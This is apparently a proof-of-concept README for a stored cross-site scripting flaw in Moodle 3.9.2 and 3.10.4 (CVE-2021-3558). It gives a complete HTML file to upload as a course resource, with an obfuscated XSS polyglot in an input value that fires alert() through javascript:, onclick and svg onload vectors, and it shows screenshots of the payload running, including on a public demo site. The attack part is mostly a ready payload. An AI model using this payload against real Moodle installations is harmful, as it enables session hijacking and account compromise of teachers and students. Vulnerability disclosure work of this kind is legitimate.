# Exploit XSS Polyglot on Moodle 3.9.2 - 3.10.4
This PoC describe how to exploit XSS on Moodle 3.9.2, 3.10.4 with Polyglot payload.

_____________________________________________________________________________

## Description

When creating a course, you can upload HTML files as a resource. When uploading an HTML file containing an ```<input>``` tag that has an XSS polyglot payload as "value" it is possible to perform a Cross-Site Scripting.

Version affected: tested on Moodle 3.9.2 and 3.10.4

CVE ID: 2021-3558

_____________________________________________________________________________

## Payload

```
<html>
    <head>
        <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>POC XSS Moodle</title>
        
    </head>
    <body>
        <h1>POC XSS Moodle</h1>

<input type="text" value="

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

"></input>
              
  
    </body>
</html>
```

________________________________________________________________________________

## Screens


My PoC

![Captura de Tela 2021-05-13 às 11 30 37](https://user-images.githubusercontent.com/1153876/118142542-da36c200-b3e0-11eb-813a-1ffc721fde59.png)


On version 3.9.2

![Captura de Tela 2021-05-13 às 11 32 12](https://user-images.githubusercontent.com/1153876/118143284-8e384d00-b3e1-11eb-9785-e14dcf2f6a7c.png)


On version 3.10.4 (tested on https://sandbox.moodledemo.net/ as teacher, student and guest)

![Captura de Tela 2021-05-15 às 12 52 44](https://user-images.githubusercontent.com/1153876/118370799-c2e20b00-b57f-11eb-8df3-76e7a2124875.png)





